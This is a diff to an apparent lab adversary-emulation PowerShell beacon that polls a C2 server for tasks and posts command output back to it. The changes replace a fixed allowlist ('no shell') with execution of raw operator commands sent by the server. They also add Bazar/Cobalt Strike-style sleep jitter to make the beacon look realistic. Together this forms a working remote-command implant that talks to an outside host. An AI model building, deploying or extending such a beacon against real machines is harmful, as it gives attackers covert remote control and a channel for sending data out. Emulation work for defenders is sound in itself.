@@ -4,7 +4,8 @@
 # Campaign mapping:
 #   - Bazar/CS-like callback loop over web channel      -> T1071.001 (context)
 #   - public-IP check (myexternalip analog)             -> T1016
-#   - fixed allowlisted task execution (no shell)       -> C2 role surrogate
+#   - operator-tasked command execution (v3: raw commands via /cmd; allowlist
+#     tasks as fallback / idle keep-alive)                     -> C2 role surrogate
 #
 # NO HARDCODED LAB VALUES: everything is read from the config
 # INI (-Config). Session token comes from environment
@@ -41,11 +42,13 @@ $hostAlias = Get-IniValue $cfg 'c2sim' 'host_alias'
 $runId   = Get-IniValue $cfg 'lab' 'run_id'
 $loops   = [int](Get-IniValue $cfg 'beacon' 'loop_count')
 $sleep   = [int](Get-IniValue $cfg 'beacon' 'loop_sleep_sec')
+$jitter  = [int](Get-IniValue $cfg 'beacon' 'loop_sleep_jitter_sec')
+if (-not $jitter) { $jitter = 0 }
 $ipCheck = Get-IniValue $cfg 'beacon' 'public_ip_check_enabled'
 $ipUrl   = Get-IniValue $cfg 'beacon' 'public_ip_check_url'
 $cap     = [int](Get-IniValue $cfg 'beacon' 'result_cap_bytes')
 
-# ---- allowlisted task -> benign command map (from config, no arbitrary input) ----
+# ---- allowlist fallback task map (v3: raw operator commands come from the server) ----
 $taskMap = @{
     'T-DISCOVER-CORPUS' = Get-IniValue $cfg 'beacon' 'task_T-DISCOVER-CORPUS'
     'T-BEACON-SLEEP'    = Get-IniValue $cfg 'beacon' 'task_T-BEACON-SLEEP'
@@ -80,10 +83,14 @@ try {
 $count = if ($Once) { 1 } else { $loops }
 for ($i = 0; $i -lt $count; $i++) {
     $taskResp = Invoke-WebRequest -Method GET -Uri "$c2Url/task/next?session=$token" -UseBasicParsing -TimeoutSec 10
-    $task = ($taskResp.Content | ConvertFrom-Json).task
-    $cmd = $taskMap[$task]
+    $taskObj = ($taskResp.Content | ConvertFrom-Json)
+    $task = $taskObj.task
+    # v3: the server may task a RAW operator command (OP-CMD with .cmd); otherwise
+    # fall back to the config task map (idle keep-alive => T-NOOP when unmapped).
+    $cmd = $taskObj.cmd
+    if (-not $cmd) { $cmd = $taskMap[$task] }
     if (-not $cmd) { $cmd = $taskMap['T-NOOP'] }
-    # bounded benign execution of an allowlisted command;
+    # bounded benign execution of a tasked (operator or allowlist) command;
     # a task command may legitimately fail (e.g. no browser service in an
     # isolated lab) - capture its stderr as the result instead of aborting.
     $result = ''
@@ -96,6 +103,11 @@ for ($i = 0; $i -lt $count; $i++) {
     if ([string]::IsNullOrWhiteSpace($result)) { $result = "(no output)" }
     $body = [System.Text.Encoding]::UTF8.GetBytes($result)
     Invoke-WebRequest -Method POST -Uri "$c2Url/result?session=$token&task=$task" -Body $body -UseBasicParsing -TimeoutSec 10 | Out-Null
-    Start-Sleep -Seconds $sleep
+    # realistic beacon cadence: fixed sleep + random jitter (Bazar/CS-like)
+    $s = $sleep
+    if ($jitter -gt 0) {
+        $s = [Math]::Max(0, $sleep + (Get-Random -Minimum (-$jitter) -Maximum ($jitter + 1)))
+    }
+    Start-Sleep -Seconds $s
 }
 Write-Output "beacon cycle complete (stage=$stage host=$hostAlias token=${token})"
